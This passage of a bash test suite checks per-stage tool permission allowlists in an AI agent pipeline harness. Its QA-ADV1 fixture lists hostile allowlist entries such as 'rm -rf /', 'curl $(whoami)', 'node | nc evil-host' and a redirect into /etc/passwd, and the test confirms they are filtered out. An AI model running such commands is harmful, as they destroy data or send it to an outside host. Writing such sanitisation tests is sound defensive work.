fi

# ─── ENG-49 Gap #7: prompt↔allowlist contract ─────────────────────────
# For each stage, every `gh pr <verb>` token appearing in
# AGENT_PROMPTS.md §S must be allowlisted in allowed_tools_for(S).
# Token regex matches shell-shaped instances: line-start whitespace
# (or backtick) + `gh pr ` + one verb word.
HARNESS_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

contract_check_stage() {
  local stage="$1" section="$2"
  local section_body verbs missing=""
  section_body="$(awk -v h="$section" '
    /^## /{ if (in_section) exit; if (index($0, h)) {in_section=1; next} }
    in_section{print}
  ' "$HARNESS_ROOT/AGENT_PROMPTS.md")"
  verbs="$(printf '%s\n' "$section_body" \
    | grep -oE '(`|^[[:space:]]+)gh pr [a-z]+' \
    | grep -oE 'gh pr [a-z]+' \
    | sort -u || true)"
  local tools; tools="$(allowed_tools_for "$stage")"
  while IFS= read -r v; do
    [[ -z "$v" ]] && continue
    [[ "$tools" == *"$v"* ]] || missing+="$v "
  done <<<"$verbs"
  if [[ -z "$missing" ]]; then
    pass_at "Gap-7 contract: $stage allowlist covers all gh pr verbs in §$section"
  else
    fail_at "Gap-7 contract: $stage allowlist missing: $missing" "tools: $tools"
  fi
}

printf '\n--- ENG-49 Gap #7: prompt<->allowlist contract ---\n'
contract_check_stage implementing  "## 3. Implementation Agent (Backend)"
contract_check_stage ui            "## 4. UI Agent (Frontend)"
contract_check_stage reviewing     "## 5. Review Agent"
contract_check_stage qa            "## 6. QA Agent"
contract_check_stage building      "## 7. Build Agent"

# ─── ENG-53 #8: harness target's dispatch.tools populated ──────────────
# Per the ENG-44 dogfood post-mortem: the implement and qa stages on
# harness-self had no allowlisted way to invoke `bash bin/<name>-test.sh`
# (the harness's testing convention per learned-rules/harness/project-
# profile.md). Implement shipped a broken `read -r cfg sf` test that
# pass-by-accident; qa explicitly flagged "harness sandbox blocked
# direct `bash bin/<test>.sh` execution" before proceeding. The fix is
# pure config — populate harness's own .pipeline-config/config.json::
# dispatch.tools.{implement,qa}[] with the test-runner pattern. ENG-51's
# dispatch.tools mechanism does the rest.
#
# This assertion is a static check on the committed config — if a future
# edit drops the entries, this trips.
printf '\n--- ENG-53 #8: harness profile populates dispatch.tools test-runner ---\n'
# .pipeline-config/ is gitignored — config.json is per-operator. This
# assertion warns the operator running tests against TARGET_REPO=harness
# if their local config drifts from the recommended dispatch.tools
# population. CI / other-target operators (file missing) skip silently.
HARNESS_CONFIG="$HARNESS_ROOT/.pipeline-config/config.json"
if [[ -f "$HARNESS_CONFIG" ]]; then
  expected_count="$(ls "$HARNESS_ROOT"/bin/*-test.sh 2>/dev/null | wc -l | tr -d ' ')"
  for stage in implementing qa; do
    has_broken_wildcard="$(jq -r --arg s "$stage" '
      (.dispatch.tools[$s] // []) as $arr
      | if ($arr | type) == "array"
        then $arr | any(. == "Bash(bash bin/*-test.sh:*)")
        else false end
    ' "$HARNESS_CONFIG" 2>/dev/null || printf 'false')"
    actual_count="$(jq -r --arg s "$stage" '
      (.dispatch.tools[$s] // []) as $arr
      | if ($arr | type) == "array"
        then [$arr[] | select(test("^Bash\\(bash bin/[^*]+-test\\.sh:\\*\\)$"))] | length
        else 0 end
    ' "$HARNESS_CONFIG" 2>/dev/null || printf '0')"
    if [[ "$has_broken_wildcard" == "true" ]]; then
      fail_at "ENG-53#8/ENG-77: harness config.json::dispatch.tools.${stage} contains broken wildcard Bash(bash bin/*-test.sh:*)" \
        "Claude's permission matcher does not expand the inner '*' as a glob — the pattern matches no actual test script. Replace with one literal Bash(bash bin/<name>-test.sh:*) entry per script. See CLAUDE.md '## Per-target dispatch.tools extras' for the regen one-liner."
    elif (( actual_count >= expected_count )); then
      pass_at "ENG-53#8: harness config.json::dispatch.tools.${stage} enumerates ${actual_count} test runners (>= ${expected_count} on disk)"
    else
      fail_at "ENG-53#8: harness config.json::dispatch.tools.${stage} only enumerates ${actual_count} test runners; ${expected_count} bin/*-test.sh files exist on disk" \
        "see CLAUDE.md '## Per-target dispatch.tools extras' for the regen one-liner."
    fi
  done
else
  printf 'SKIP ENG-53#8: %s not present (CI or non-harness target) — skipping config drift check\n' "$HARNESS_CONFIG"
fi

# ─── ENG-87 review-iter-7 M6: PIPELINE_DISPATCH_ID propagation pin ──
# bin/dispatch.sh's claude-invocation env-block carries PIPELINE_DISPATCH_ID
# + PIPELINE_STAGE so that bin/linear.sh's chokepoint sees them in the
# agent subprocess. The whole auto-injection contract collapses if a
# refactor drops or renames either env var. Pin source-level: the
# `env`-block / claude-invocation site must reference both names.
printf '\n--- ENG-87 review-iter-7 M6: PIPELINE_DISPATCH_ID env propagation ---\n'

DISP_SRC_FOR_M6="$SCRIPT_DIR/dispatch.sh"
if [[ -f "$DISP_SRC_FOR_M6" ]]; then
  if grep -qE 'PIPELINE_DISPATCH_ID' "$DISP_SRC_FOR_M6" && \
     grep -qE 'PIPELINE_STAGE' "$DISP_SRC_FOR_M6"; then
    pass_at "ENG-87 M6-iter7: dispatch.sh references PIPELINE_DISPATCH_ID and PIPELINE_STAGE (env-block pin)"
  else
    fail_at "ENG-87 M6-iter7: dispatch.sh references PIPELINE_DISPATCH_ID + PIPELINE_STAGE" \
      "either env var missing — auto-injection chokepoint relies on these reaching the agent subprocess via dispatch.sh's env block (~line 439-441)"
  fi
else
  printf 'SKIP ENG-87 M6-iter7: dispatch.sh not present at %s — skipping env-propagation pin\n' "$DISP_SRC_FOR_M6"
fi

# ─── ENG-94: dispatch.sh::allowed_tools_for consumes project-profile Tool allowlist ───
# Five fixtures exercising _dispatch_tools_from_profile + composition tail:
#   1. Tauri profile (back-compat) — implementing/ui/qa regain cargo/bun/rustc/npx/node
#      via profile, NOT via base.
#   2. Python profile — implementing/qa get pytest, NOT cargo.
#   3. Go profile — implementing/qa get `go test`, NOT cargo.
#   4. Fallback fixture (AC#3 warn branch) — schema_version 1 → empty + warning.
#   5. Empty-section fixture (AC#3 no-warn branch) — schema_version 2 with
#      `- implementing: (none)` → empty + NO warning.
#
# Each fixture overrides HARNESS_ROOT to a mktemp -d layout (matching the
# source-and-override pattern documented in bin/render-prompt-slug-test.sh:32–63).
# The pre-existing HARNESS_ROOT (set at line 2090 for the Gap-7 contract check)
# is restored at the end of each fixture so subsequent assertions are unaffected.
printf '\n--- ENG-94: project-profile Tool allowlist composition ---\n'
_ENG94_SAVED_HARNESS_ROOT="$HARNESS_ROOT"
_ENG94_SAVED_PROJECT_SLUG="$PROJECT_SLUG"

# Fixture 1 — Tauri profile (back-compat). Stub a schema_version 2 profile
# listing cargo/bun/rustc for implementing, cargo/bun/npx/node for ui, and
# cargo/bun/npx/node for qa. Assert each stage's composed return value
# contains the Tauri tokens via PROFILE (not via base).
_ENG94_TAURI_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_TAURI_ROOT"
mkdir -p "$_ENG94_TAURI_ROOT/learned-rules/eng94-tauri-slug"
cat > "$_ENG94_TAURI_ROOT/learned-rules/eng94-tauri-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-tauri-slug
generated_at: 2026-05-13T00:00:00Z
generated_by: eng94-test
schema_version: 2
---

# Project profile — eng94-tauri-slug

## Stack
Tauri (test fixture).

## Build & test gates
- Build: `bun tauri build`
- Test: `cargo test`
- Lint/check: `cargo clippy`
- Integration/E2E: `(n/a)`

## Tool allowlist
- brainstorming: (none)
- planning: (none)
- implementing:
  - `Bash(cargo:*)`
  - `Bash(bun:*)`
  - `Bash(rustc:*)`
- ui:
  - `Bash(cargo:*)`
  - `Bash(bun:*)`
  - `Bash(npx:*)`
  - `Bash(node:*)`
- reviewing: (none)
- qa:
  - `Bash(cargo:*)`
  - `Bash(bun:*)`
  - `Bash(npx:*)`
  - `Bash(node:*)`
- building: (none)
- released: (none)

## File layout
- test fixture.

## Language idioms
- test.

## Don'ts
- none.
PROFILE
HARNESS_ROOT="$_ENG94_TAURI_ROOT"
PROJECT_SLUG="eng94-tauri-slug"
_ENG94_TAURI_IMPL="$(allowed_tools_for implementing 2>/dev/null)"
_ENG94_TAURI_UI="$(allowed_tools_for ui 2>/dev/null)"
_ENG94_TAURI_QA="$(allowed_tools_for qa 2>/dev/null)"
for token in 'Bash(cargo:*)' 'Bash(bun:*)' 'Bash(rustc:*)'; do
  if [[ "$_ENG94_TAURI_IMPL" == *"$token"* ]]; then
    pass_at "ENG-94 Fixture 1 (Tauri): implementing carries $token via profile"
  else
    fail_at "ENG-94 Fixture 1 (Tauri): implementing missing $token" "got: $_ENG94_TAURI_IMPL"
  fi
done
for token in 'Bash(cargo:*)' 'Bash(bun:*)' 'Bash(npx:*)' 'Bash(node:*)'; do
  if [[ "$_ENG94_TAURI_UI" == *"$token"* ]]; then
    pass_at "ENG-94 Fixture 1 (Tauri): ui carries $token via profile"
  else
    fail_at "ENG-94 Fixture 1 (Tauri): ui missing $token" "got: $_ENG94_TAURI_UI"
  fi
  if [[ "$_ENG94_TAURI_QA" == *"$token"* ]]; then
    pass_at "ENG-94 Fixture 1 (Tauri): qa carries $token via profile"
  else
    fail_at "ENG-94 Fixture 1 (Tauri): qa missing $token" "got: $_ENG94_TAURI_QA"
  fi
done
# Pin AC#1: base no longer carries the tokens (the profile is the sole source).
# The composition is base,profile,extras — base should NOT contain cargo etc.
# We assert this by clearing the profile and re-checking:
HARNESS_ROOT="$_TEST_STUB_DIR/empty-root"  # no profile path → empty
mkdir -p "$HARNESS_ROOT"
_ENG94_BARE_IMPL="$(allowed_tools_for implementing 2>/dev/null)"
if [[ "$_ENG94_BARE_IMPL" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 AC#1: implementing base (no profile) does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 AC#1: implementing base still carries Bash(cargo:*) after case-arm cleanup" \
    "got: $_ENG94_BARE_IMPL"
fi
HARNESS_ROOT="$_ENG94_TAURI_ROOT"  # restore for any subsequent reference
_test_safe_rm "$_ENG94_TAURI_ROOT"

# Fixture 2 — Python profile. Stub a schema_version 2 profile listing
# pytest/pip/python3 for implementing AND qa. Assert each stage's composed
# output contains pytest via profile and does NOT contain cargo (case-arm
# cleanup removed cargo from base).
_ENG94_PYTHON_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_PYTHON_ROOT"
mkdir -p "$_ENG94_PYTHON_ROOT/learned-rules/eng94-python-slug"
cat > "$_ENG94_PYTHON_ROOT/learned-rules/eng94-python-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-python-slug
schema_version: 2
---

# Project profile — eng94-python-slug

## Stack
Python (test fixture).

## Tool allowlist
- brainstorming: (none)
- planning: (none)
- implementing:
  - `Bash(pytest:*)`
  - `Bash(pip:*)`
  - `Bash(python3:*)`
- ui: (none)
- reviewing: (none)
- qa:
  - `Bash(pytest:*)`
  - `Bash(pip:*)`
  - `Bash(python3:*)`
- building: (none)
- released: (none)
PROFILE
HARNESS_ROOT="$_ENG94_PYTHON_ROOT"
PROJECT_SLUG="eng94-python-slug"
_ENG94_PY_IMPL="$(allowed_tools_for implementing 2>/dev/null)"
_ENG94_PY_QA="$(allowed_tools_for qa 2>/dev/null)"
if [[ "$_ENG94_PY_IMPL" == *'Bash(pytest:*)'* ]]; then
  pass_at "ENG-94 Fixture 2 (Python): implementing carries Bash(pytest:*) via profile"
else
  fail_at "ENG-94 Fixture 2 (Python): implementing missing Bash(pytest:*)" "got: $_ENG94_PY_IMPL"
fi
if [[ "$_ENG94_PY_IMPL" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 2 (Python): implementing does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 2 (Python): implementing unexpectedly contains Bash(cargo:*)" "got: $_ENG94_PY_IMPL"
fi
if [[ "$_ENG94_PY_QA" == *'Bash(pytest:*)'* ]]; then
  pass_at "ENG-94 Fixture 2 (Python): qa carries Bash(pytest:*) via profile"
else
  fail_at "ENG-94 Fixture 2 (Python): qa missing Bash(pytest:*)" "got: $_ENG94_PY_QA"
fi
if [[ "$_ENG94_PY_QA" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 2 (Python): qa does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 2 (Python): qa unexpectedly contains Bash(cargo:*)" "got: $_ENG94_PY_QA"
fi
_test_safe_rm "$_ENG94_PYTHON_ROOT"

# Fixture 3 — Go profile. Stub a schema_version 2 profile listing
# go test/go build/go vet/gofmt for implementing AND qa. The `go test`
# pattern's internal space exercises the awk regex's tolerance of
# multi-word command names.
_ENG94_GO_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_GO_ROOT"
mkdir -p "$_ENG94_GO_ROOT/learned-rules/eng94-go-slug"
cat > "$_ENG94_GO_ROOT/learned-rules/eng94-go-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-go-slug
schema_version: 2
---

# Project profile — eng94-go-slug

## Stack
Go (test fixture).

## Tool allowlist
- brainstorming: (none)
- planning: (none)
- implementing:
  - `Bash(go test:*)`
  - `Bash(go build:*)`
  - `Bash(go vet:*)`
  - `Bash(gofmt:*)`
- ui: (none)
- reviewing: (none)
- qa:
  - `Bash(go test:*)`
  - `Bash(go build:*)`
  - `Bash(go vet:*)`
  - `Bash(gofmt:*)`
- building: (none)
- released: (none)
PROFILE
HARNESS_ROOT="$_ENG94_GO_ROOT"
PROJECT_SLUG="eng94-go-slug"
_ENG94_GO_IMPL="$(allowed_tools_for implementing 2>/dev/null)"
_ENG94_GO_QA="$(allowed_tools_for qa 2>/dev/null)"
if [[ "$_ENG94_GO_IMPL" == *'Bash(go test:*)'* ]]; then
  pass_at "ENG-94 Fixture 3 (Go): implementing carries Bash(go test:*) via profile"
else
  fail_at "ENG-94 Fixture 3 (Go): implementing missing Bash(go test:*)" "got: $_ENG94_GO_IMPL"
fi
if [[ "$_ENG94_GO_IMPL" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 3 (Go): implementing does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 3 (Go): implementing unexpectedly contains Bash(cargo:*)" "got: $_ENG94_GO_IMPL"
fi
if [[ "$_ENG94_GO_QA" == *'Bash(go test:*)'* ]]; then
  pass_at "ENG-94 Fixture 3 (Go): qa carries Bash(go test:*) via profile"
else
  fail_at "ENG-94 Fixture 3 (Go): qa missing Bash(go test:*)" "got: $_ENG94_GO_QA"
fi
if [[ "$_ENG94_GO_QA" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 3 (Go): qa does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 3 (Go): qa unexpectedly contains Bash(cargo:*)" "got: $_ENG94_GO_QA"
fi
_test_safe_rm "$_ENG94_GO_ROOT"

# Fixture 4 — Fallback (AC#3 warn branch). Stub a schema_version 1 profile
# (no Tool allowlist section). Capture stderr; assert composed output is
# empty of stack tokens, exactly one warning fires, helper returns 0.
_ENG94_FB_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_FB_ROOT"
mkdir -p "$_ENG94_FB_ROOT/learned-rules/eng94-fallback-slug"
cat > "$_ENG94_FB_ROOT/learned-rules/eng94-fallback-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-fallback-slug
schema_version: 1
---
# Project profile — eng94-fallback-slug
## Stack
test fixture.
PROFILE
HARNESS_ROOT="$_ENG94_FB_ROOT"
PROJECT_SLUG="eng94-fallback-slug"
_ENG94_FB_STDERR="$(mktemp)"
_test_assert_temp_path "$_ENG94_FB_STDERR"
_ENG94_FB_OUT="$(allowed_tools_for implementing 2>"$_ENG94_FB_STDERR")"
_ENG94_FB_RC=$?
if (( _ENG94_FB_RC == 0 )); then
  pass_at "ENG-94 Fixture 4 (Fallback): allowed_tools_for returns 0 (does NOT die on schema v1)"
else
  fail_at "ENG-94 Fixture 4 (Fallback): allowed_tools_for exited non-zero (rc=$_ENG94_FB_RC)" ""
fi
if [[ "$_ENG94_FB_OUT" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 4 (Fallback): composed output lacks Bash(cargo:*) (AC#3 + AC#1)"
else
  fail_at "ENG-94 Fixture 4 (Fallback): composed output unexpectedly contains Bash(cargo:*)" "got: $_ENG94_FB_OUT"
fi
_ENG94_FB_WARN_COUNT="$(grep -cE '\[allowed-tools\] project-profile.md schema_version != 2' "$_ENG94_FB_STDERR" 2>/dev/null || true)"
if [[ "$_ENG94_FB_WARN_COUNT" == "1" ]]; then
  pass_at "ENG-94 Fixture 4 (Fallback): exactly one schema-version warning fired"
else
  fail_at "ENG-94 Fixture 4 (Fallback): expected 1 schema-version warning, got $_ENG94_FB_WARN_COUNT" \
    "stderr: $(cat "$_ENG94_FB_STDERR")"
fi
rm -f "$_ENG94_FB_STDERR"
_test_safe_rm "$_ENG94_FB_ROOT"

# Fixture 5 — Empty-section (AC#3 no-warn branch). Stub a schema_version 2
# profile with present-but-empty Tool allowlist for implementing
# (`- implementing: (none)`). Assert composed output lacks profile tokens
# AND zero `[allowed-tools]` warnings fire.
_ENG94_ES_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_ES_ROOT"
mkdir -p "$_ENG94_ES_ROOT/learned-rules/eng94-empty-slug"
cat > "$_ENG94_ES_ROOT/learned-rules/eng94-empty-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-empty-slug
schema_version: 2
---
# Project profile — eng94-empty-slug
## Stack
test fixture.

## Tool allowlist
- brainstorming: (none)
- planning: (none)
- implementing: (none)
- ui: (none)
- reviewing: (none)
- qa: (none)
- building: (none)
- released: (none)
PROFILE
HARNESS_ROOT="$_ENG94_ES_ROOT"
PROJECT_SLUG="eng94-empty-slug"
_ENG94_ES_STDERR="$(mktemp)"
_test_assert_temp_path "$_ENG94_ES_STDERR"
_ENG94_ES_OUT="$(allowed_tools_for implementing 2>"$_ENG94_ES_STDERR")"
if [[ "$_ENG94_ES_OUT" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 5 (Empty-section): composed output lacks Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 5 (Empty-section): composed output unexpectedly contains Bash(cargo:*)" "got: $_ENG94_ES_OUT"
fi
_ENG94_ES_WARN_COUNT="$(grep -cE '\[allowed-tools\]' "$_ENG94_ES_STDERR" 2>/dev/null || true)"
if [[ "$_ENG94_ES_WARN_COUNT" == "0" ]]; then
  pass_at "ENG-94 Fixture 5 (Empty-section): no [allowed-tools] warning fired (no-warn discrimination)"
else
  fail_at "ENG-94 Fixture 5 (Empty-section): unexpected [allowed-tools] warning(s) fired" \
    "stderr: $(cat "$_ENG94_ES_STDERR")"
fi
rm -f "$_ENG94_ES_STDERR"
_test_safe_rm "$_ENG94_ES_ROOT"

# ─── ENG-94 QA-authored adversarial coverage (QA-ADV 1..7) ───────────────
# Six categories the plan's Failure Mode -> Test Map either deferred ("future
# work" / "no synthetic test") or left implicit. Concurrency is N/A: the
# helper is purely functional and the orchestrator's claude_mutex serializes
# dispatches, so two parallel reads cannot race. Pinned here so a future
# refactor that accidentally widens the surface (e.g. a metachar leak, a
# cross-stage bleed, a stray-comma regression in the composition tail) is
# caught at unit time rather than empirically post-deploy.
printf '\n--- ENG-94 QA-authored adversarial (QA-ADV) ---\n'

# QA-ADV 1 — D-8 shell-metachar hygiene. Profile lists `Bash(cargo:*)` plus
# seven metachar-bearing payloads. Assert only the clean pattern reaches the
# composed output and the rejection emits NO stderr warning (the awk filter
# silently `next`s past metachars per the implementation — no `log` call).
# Also assert the warning surface (if any future regression starts logging)
# does NOT leak the pattern text per D-8's "Why" + ENG-46.
_QA_ADV1_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV1_ROOT"
mkdir -p "$_QA_ADV1_ROOT/learned-rules/qa-adv1-slug"
cat > "$_QA_ADV1_ROOT/learned-rules/qa-adv1-slug/project-profile.md" <<'PROFILE'
---
schema_version: 2
---
# Project profile — qa-adv1-slug
## Tool allowlist
- implementing:
  - `Bash(cargo:*)`
  - `Bash(echo X; rm -rf /:*)`
  - `Bash(curl $(whoami):*)`
  - `Bash(node | nc evil-host:*)`
  - `Bash(go test > /etc/passwd:*)`
  - `Bash(rm & sleep 1:*)`
  - `Bash(echo `whoami`:*)`
  - `Bash(foo(:*)`
- qa: (none)
PROFILE
HARNESS_ROOT="$_QA_ADV1_ROOT"
PROJECT_SLUG="qa-adv1-slug"
_QA_ADV1_STDERR="$(mktemp)"
_test_assert_temp_path "$_QA_ADV1_STDERR"
_QA_ADV1_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV1_STDERR")"
if [[ "$_QA_ADV1_OUT" == *'Bash(cargo:*)'* ]]; then
  pass_at "QA-ADV1 (D-8 hygiene): clean Bash(cargo:*) reaches composed output"
else
  fail_at "QA-ADV1 (D-8 hygiene): clean Bash(cargo:*) missing from composed output" "got: $_QA_ADV1_OUT"
fi
for bad in 'rm -rf /' 'whoami' 'nc evil-host' '/etc/passwd' 'sleep 1' 'echo `'; do
  if [[ "$_QA_ADV1_OUT" != *"$bad"* ]]; then
    pass_at "QA-ADV1 (D-8 hygiene): metachar payload [$bad] dropped from composed output"
  else
    fail_at "QA-ADV1 (D-8 hygiene): metachar payload [$bad] leaked into composed output" "got: $_QA_ADV1_OUT"
  fi
done
# Paren-imbalance rejection — `Bash(foo(:*)` has unbalanced parens after the
# parser's outer-paren strip and should be dropped.
if [[ "$_QA_ADV1_OUT" != *'Bash(foo(:*)'* ]]; then
  pass_at "QA-ADV1 (D-8 hygiene): paren-imbalance payload Bash(foo(:*) dropped"
else
  fail_at "QA-ADV1 (D-8 hygiene): paren-imbalance payload Bash(foo(:*) leaked" "got: $_QA_ADV1_OUT"
fi
# Stderr must NOT contain any pattern fragment (ENG-46 + D-8: warnings never
# echo matched pattern text). The metachar branch emits no warning at all
# per implementation; this assertion future-pins that property.
_QA_ADV1_STDERR_BODY="$(cat "$_QA_ADV1_STDERR" 2>/dev/null || true)"
_QA_ADV1_LEAKED=""
for bad in 'rm -rf' 'whoami' 'nc evil-host' '/etc/passwd' 'foo('; do
  if [[ "$_QA_ADV1_STDERR_BODY" == *"$bad"* ]]; then
    _QA_ADV1_LEAKED="$_QA_ADV1_LEAKED [$bad]"
  fi
done
if [[ -z "$_QA_ADV1_LEAKED" ]]; then
  pass_at "QA-ADV1 (D-8 hygiene): stderr does NOT leak any metachar pattern fragment (ENG-46 invariant)"
else
  fail_at "QA-ADV1 (D-8 hygiene): stderr leaked pattern fragment(s):$_QA_ADV1_LEAKED" "stderr: $_QA_ADV1_STDERR_BODY"
fi
rm -f "$_QA_ADV1_STDERR"
_test_safe_rm "$_QA_ADV1_ROOT"

# QA-ADV 2 — Cross-stage isolation. Profile lists implementing+qa with
# DISTINCT tokens and omits `ui`. Assert ui composed output lacks both
# stages' profile-derived tokens (no neighbor-stage bleed).
_QA_ADV2_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV2_ROOT"
mkdir -p "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug"
cat > "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug/project-profile.md" <<'PROFILE'
---
schema_version: 2
---
# Project profile — qa-adv2-slug
## Tool allowlist
- implementing:
  - `Bash(pytest:*)`
- qa:
  - `Bash(ruff:*)`
PROFILE
HARNESS_ROOT="$_QA_ADV2_ROOT"
PROJECT_SLUG="qa-adv2-slug"
_QA_ADV2_UI="$(allowed_tools_for ui 2>/dev/null)"
if [[ "$_QA_ADV2_UI" != *'Bash(pytest:*)'* && "$_QA_ADV2_UI" != *'Bash(ruff:*)'* ]]; then
  pass_at "QA-ADV2 (cross-stage isolation): ui composed lacks implementing/qa profile tokens"
else
  fail_at "QA-ADV2 (cross-stage isolation): ui composed leaked neighbor-stage tokens" "got: $_QA_ADV2_UI"
fi
# Stage-name prefix-match false-positive. The helper's `current_stage == STAGE`
# guard is exact-match awk equality — pin this by giving the profile an
# `- implement:` key (no `-ing` suffix) AND a real `- implementing:` key with
# distinct payload, then querying `implementing`. The implementing query MUST
# carry only its own tokens; the `implement` tokens MUST NOT leak.
cat > "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug/project-profile.md" <<'PROFILE'
---
schema_version: 2
---
# Project profile — qa-adv2-slug
## Tool allowlist
- implement:
  - `Bash(SHOULD_NOT_LEAK:*)`
- implementing:
  - `Bash(pytest:*)`
PROFILE
_QA_ADV2_IMPL2="$(allowed_tools_for implementing 2>/dev/null)"
if [[ "$_QA_ADV2_IMPL2" == *'Bash(pytest:*)'* && "$_QA_ADV2_IMPL2" != *'SHOULD_NOT_LEAK'* ]]; then
  pass_at "QA-ADV2 (prefix isolation): \`- implement:\` key does NOT bleed into \`implementing\` query"
else
  fail_at "QA-ADV2 (prefix isolation): \`- implement:\` token leaked into \`implementing\` query" "got: $_QA_ADV2_IMPL2"
fi
_test_safe_rm "$_QA_ADV2_ROOT"

# QA-ADV 3 — Composition shape. No profile + no extras must produce a clean
# base with no `,,` (double-comma) and no trailing `,`. The empty-segment
# elision in `allowed_tools_for`'s composition tail (`[[ -n "$profile_tools" ]] && ...`)
# is the load-bearing guard; pin its observable shape.
HARNESS_ROOT="$_TEST_STUB_DIR/empty-root-qa-adv3"
mkdir -p "$HARNESS_ROOT"
PROJECT_SLUG="qa-adv3-no-profile"
_QA_ADV3_OUT="$(allowed_tools_for implementing 2>/dev/null)"
if [[ "$_QA_ADV3_OUT" != *,,* ]]; then
  pass_at "QA-ADV3 (composition shape): empty profile + empty extras produces no double-comma"
else
  fail_at "QA-ADV3 (composition shape): composed output contains a double-comma" "got: $_QA_ADV3_OUT"
fi
if [[ "$_QA_ADV3_OUT" != *, ]]; then
  pass_at "QA-ADV3 (composition shape): empty profile + empty extras produces no trailing comma"
else
  fail_at "QA-ADV3 (composition shape): composed output has trailing comma" "got: $_QA_ADV3_OUT"
fi

# QA-ADV 4 — CRLF graceful-handling. The implementation's main awk parser
# carries a `sub(/\r$/, "")` line, suggesting CRLF tolerance intent. The
# schema-version detector awk above it (bin/dispatch.sh:328-332) does NOT
# strip CRLF — surfaced by this fixture during QA adversarial coverage. The
# plan does NOT promise CRLF tolerance (the discovery-agent writer emits
# LF-only via bash heredoc), so the OBSERVABLE contract under a CRLF profile
# is: (a) helper returns 0 (no die), (b) composed output is well-formed
# (no stray commas, no half-parsed pattern fragments), (c) either patterns
# parse OR a single schema-version warning fires. Fully-tolerant CRLF
# parsing is a follow-up (see PR summary).
_QA_ADV4_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV4_ROOT"
mkdir -p "$_QA_ADV4_ROOT/learned-rules/qa-adv4-slug"
{
  printf -- '---\r\n'
  printf -- 'schema_version: 2\r\n'
  printf -- '---\r\n'
  printf -- '# Project profile\r\n'
  printf -- '## Tool allowlist\r\n'
  printf -- '- implementing:\r\n'
  printf -- '  - `Bash(cargo:*)`\r\n'
  printf -- '  - `Bash(bun:*)`\r\n'
} > "$_QA_ADV4_ROOT/learned-rules/qa-adv4-slug/project-profile.md"
HARNESS_ROOT="$_QA_ADV4_ROOT"
PROJECT_SLUG="qa-adv4-slug"
_QA_ADV4_STDERR="$(mktemp)"
_test_assert_temp_path "$_QA_ADV4_STDERR"
_QA_ADV4_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV4_STDERR")"
_QA_ADV4_RC=$?
if (( _QA_ADV4_RC == 0 )); then
  pass_at "QA-ADV4 (CRLF graceful): helper returns 0 against CRLF profile (no die)"
else
  fail_at "QA-ADV4 (CRLF graceful): helper exited non-zero against CRLF profile (rc=$_QA_ADV4_RC)" ""
fi
if [[ "$_QA_ADV4_OUT" != *,,* && "$_QA_ADV4_OUT" != *, ]]; then
  pass_at "QA-ADV4 (CRLF graceful): composed output is well-formed (no stray commas / trailing comma)"
else
  fail_at "QA-ADV4 (CRLF graceful): composed output is malformed under CRLF input" "got: $_QA_ADV4_OUT"
fi
# Either patterns load (LF parser tolerated CRLF) OR a single schema-version
# warning fires (current behavior: schema-version awk fails to detect v2 due
# to un-stripped \r). Both are acceptable graceful-handling outcomes — the
# contract is "no silent half-parse, no crash". Pin BOTH branches so a
# future fully-CRLF-tolerant fix flips cleanly.
_QA_ADV4_WARN_COUNT="$(grep -cE '\[allowed-tools\]' "$_QA_ADV4_STDERR" 2>/dev/null || true)"
if [[ "$_QA_ADV4_OUT" == *'Bash(cargo:*)'* ]] || [[ "$_QA_ADV4_WARN_COUNT" -ge 1 ]]; then
  pass_at "QA-ADV4 (CRLF graceful): either patterns parse OR schema-version warning fires (current: warn fires)"
else
  fail_at "QA-ADV4 (CRLF graceful): silent half-parse — neither patterns loaded nor warning fired" \
    "stderr: $(cat "$_QA_ADV4_STDERR") | got: $_QA_ADV4_OUT"
fi
rm -f "$_QA_ADV4_STDERR"
_test_safe_rm "$_QA_ADV4_ROOT"

# QA-ADV 5 — HARNESS_ROOT / PROJECT_SLUG empty -> empty + NO warning (D-3
# first bullet: symmetric with _dispatch_tools_extras's `[[ -f "$CONFIG" ]] || return 0`).
# The fail-soft branch must be SILENT (no `log` warning) — this is the
# discriminator between "no profile configured" and "profile present but
# malformed", and Fixture 4 only covers the latter.
_QA_ADV5_STDERR="$(mktemp)"
_test_assert_temp_path "$_QA_ADV5_STDERR"
HARNESS_ROOT=""
PROJECT_SLUG=""
_QA_ADV5_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV5_STDERR")"
_QA_ADV5_WARN_COUNT="$(grep -cE '\[allowed-tools\]' "$_QA_ADV5_STDERR" 2>/dev/null || true)"
if [[ "$_QA_ADV5_OUT" != *'Bash(cargo:*)'* ]]; then
  pass_at "QA-ADV5 (HARNESS_ROOT empty): composed output lacks profile tokens"
else
